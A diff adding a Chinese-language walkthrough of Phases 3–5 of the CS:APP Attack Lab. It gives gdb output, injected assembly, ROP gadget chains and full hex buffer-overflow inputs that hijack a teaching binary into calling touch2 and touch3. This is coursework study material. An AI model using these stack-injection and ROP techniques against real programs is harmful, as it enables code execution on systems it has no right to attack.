@@ -163,3 +163,206 @@ ec 17 40 00 c3 00 00 00
 ```
 
 当然注入的代码也可以写道中间行，然后返回地址也需要对栈顶指针相应加一个偏移量指向我们注入代码的首地址，不过真的有人会这样做吗？
+
+### Phase 3
+
+与 Phase 1、2 共用一个程序，Phase 3 要求我们调用到 touch3 函数，要求我们将 cookie 以字符串的形式传入（而不是像 Phase 2 一样传入一个16进制的立即数）
+
+```c
+/* Compare string to hex represention of unsigned value */
+int hexmatch(unsigned val, char *sval)
+{
+     char cbuf[110];
+     /* Make position of check string unpredictable */
+     char *s = cbuf + random() % 100;
+     sprintf(s, "%.8x", val);
+     return strncmp(sval, s, 9) == 0;
+}
+void touch3(char *sval)
+{
+    vlevel = 3; /* Part of validation protocol */
+    if (hexmatch(cookie, sval)) {
+         printf("Touch3!: You called touch3(\"%s\")\n", sval);
+         validate(3);
+    } else {
+         printf("Misfire: You called touch3(\"%s\")\n", sval);
+         fail(3);
+     }
+    exit(0);
+}
+```
+
+根据所给的最后一条提示，我们的字符串不能存放到 `getbuf` 栈帧中，而应该存到 `test` 函数栈帧中。剩下的步骤就比较好办了
+
+> When functions hexmatch and strncmp are called, they push data onto the stack, overwriting
+> portions of memory that held the buffer used by `getbuf`. As a result, you will need to be careful
+> where you place the string representation of your cookie.  
+
+1. 确认字符串 `59b997fa` 的16进制表示，可以手查 ASCII 码表或网上有一键转换的工具（根据第二条提示，注入的字符串需要添加字符串终止符 `\0`
+
+   ```
+   35 39 62 39 39 37 66 61 00
+   ```
+
+2. 确认我们应该注入字符串地址在哪里，根据最后一条地址，应该在`getbuf` 返回地址的上方，函数 `test`栈帧中，确保我们注入的字符串不会被覆盖。通过在 `getbuf` 函数开辟栈空间这里打断点可以观察到此时栈地址是 `0x5561dca0` 这应该是 `test` 函数的返回地址，也是我们要注入成 `touch3` 函数的地址
+
+    ```assembly
+    (gdb) b *0x4017a8
+    Breakpoint 1 at 0x4017a8: file buf.c, line 12.
+    (gdb) r -q -i ./ans/phase_1
+    Starting program: /mnt/d/Projects/Personal/csapp-lab/attacklab/attack-handout/ctarget -q -i ./ans/phase_1
+    [Thread debugging using libthread_db enabled]
+    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+    Cookie: 0x59b997fa
+    
+    Breakpoint 1, getbuf () at buf.c:12
+    12      buf.c: No such file or directory.
+    (gdb) info r rsp
+    rsp            0x5561dca0          0x5561dca0
+    ```
+
+    `test` 函数的返回地址占了 8 字节，0x5561dca0 + 0x8 = 0x5561dca8 就是我们注入的字符串的地址
+
+3. 找到 touch3 函数地址
+
+    ```assembly
+    (gdb) x touch3
+    0x4018fa <touch3>:      0xfb894853
+    ```
+
+4. 编写汇编代码，其余操作均与 Phase 2 类似
+
+   ```assembly
+   mov $0x5561dca8, %rdi
+   push $0x4018fa
+   ret
+   ```
+
+5. 构造输入内容
+
+   ```
+   48 c7 c7 a8 dc 61 55 68
+   fa 18 40 00 c3 00 00 00 
+   00 00 00 00 00 00 00 00
+   00 00 00 00 00 00 00 00
+   00 00 00 00 00 00 00 00
+   78 dc 61 55 00 00 00 00 
+   35 39 62 39 39 37 66 61 00
+   ```
+
+### Phase 4
+
+Phase 4 的要求同 Phase 2，但是从 Phase 4 开始所用到的程序就开启了栈随机化（栈的地址将是不固定的）和并限制了可执行代码的区域（像我们在 Phase 2 中那样编写汇编代码再会变成机器指令写入缓冲区再执行就是不可能的了）
+
+ROP 攻击就是在程序内部寻找一些可以利用的指令片段，构造出我们想要执行的指令，这些片段称为 gadgets
+
+提示中告诉我们 gadgets 位于 `start_farm` 和 `mid_farm ` 之间。合法的 gadgets 必须最后是 `ret` 指令
+
+```assembly
+00000000004019a0 <addval_273>:
+  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+  4019a6:	c3                   	ret    
+
+00000000004019a7 <addval_219>:
+  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+  4019ad:	c3                   	ret    
+```
+
+由于这个题目约束我们只能使用 `movq`、`popq`、`ret` 和 `ret` 四种指令。所以我们的想法应该是先将我们的字符串放入栈顶，然后 `popq` 到 `%rdi`，这是最好的。但是经过查找并没有能实现 `popq %rdi` 指令的 gadget。那可以考虑先存入一个寄存器，再 `movq` 到 `%rdi`
+
+在 `addval_219` 可以找到 `popq %rax` 对应的指令 `58` 之后紧接 `90`是空操作然后是 `ret` 符合我们的要求，对应的地址是 `0x4019ab` （并不唯一）
+
+在 `addval_273` 可以找到 `movq %rax,%rdi` 对应的指令 `48 89 c7` 之后接的 `c3`是 `ret`指令符合要求，对应地址是 `0x4019a2`（并不唯一）
+
+由此可以得出输入内容
+
+```c
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+ab 19 40 00 00 00 00 00 // (popq %rax then ret)
+fa 97 b9 59 00 00 00 00 // 0x59b997fa
+a2 19 40 00 00 00 00 00 // (movq %rax, %rdi then ret)
+ec 17 40 00 00 00 00 00 // touch2
+```
+
+### Phase 5
+
+Phase 5 的要求同 Phase 3，相比于 Phase 4 给我们的 gadgets 更多了。我们改写 Phase 3 中编写的汇编代码，借助于 gadgets 实现类似的功能。位于 `start_farm` 和 `end_farm ` 之间。因为开启了栈随机化，我们无法将字符串写入到 `test` 栈区后会无法得知地址。观察到 gadgets 中有一个 `add_xy` 函数，如下
+
+```assembly
+00000000004019d6 <add_xy>:
+  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
+  4019da:	c3                   	ret    
+```
+
+可以实现 %rax = %rdi + %rsi 的操作，我们可以将字符串保存在栈上，然后借助偏移量把字符串地址保存到 `%rax`，再按照 Phase 4 的方法转移到 `%rdi`上。我们可以构造出如下汇编代码。
+
+```assembly
+movq %rsp,%rax
+movq %rax, %rdi # 将栈顶地址存入%rdi中
+
+popq %rax
+movl %eax, %edx
+movl %edx, %ecx
+movl %ecx, %esi # 将偏移量存入%esi中
+
+leaq (%rdi,%rsi,1),%rax # %rax = %rdi + %rsi
+movq %rax, %rdi
+```
+
+需要使用的 gadgets （不唯一）
+
+```assembly
+0000000000401a03 <addval_190>:
+  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax # 48 89 e0 -> movq %rsp,%rax
+  401a09:	c3                   	ret 
+00000000004019a0 <addval_273>:
+  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax  # 48 89 c7 -> movq %rax, %rdi
+  4019a6:	c3                   	ret    
+  
+00000000004019a7 <addval_219>:
+  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax # 58 -> popq %rax 
+  4019ad:	c3                   	ret  
+00000000004019db <getval_481>:
+  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax # 89 c2 -> movl %eax, %edx
+  4019e0:	c3                   	ret 
+0000000000401a33 <getval_159>:
+  401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax # 89 d1 -> movl %edx, %ecx
+  401a38:	c3                   	ret    
+0000000000401a11 <addval_436>:
+  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax # 89 ce -> movl %ecx, %esi
+  401a17:	c3                   	ret    
+  
+00000000004019d6 <add_xy>:
+  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax # leaq (%rdi,%rsi,1),%rax
+  4019da:	c3                   	ret    
+00000000004019a0 <addval_273>:
+  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax # 48 89 c7 -> movq %rax, %rdi
+  4019a6:	c3                   	ret    
+```
+
+由此可以得出输入内容。
+
+```c
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+06 1a 40 00 00 00 00 00
+a2 19 40 00 00 00 00 00
+ab 19 40 00 00 00 00 00
+48 00 00 00 00 00 00 00 // cookie 与返回地址相隔 9 条指令，所以偏移量应为 8*9=0x48
+dd 19 40 00 00 00 00 00
+34 1a 40 00 00 00 00 00
+13 1a 40 00 00 00 00 00
+d6 19 40 00 00 00 00 00
+a2 19 40 00 00 00 00 00
+fa 18 40 00 00 00 00 00
+35 39 62 39 39 37 66 61 00
+```
+
+最后这一个难度确实较大，参考了许多解析才得以完成。
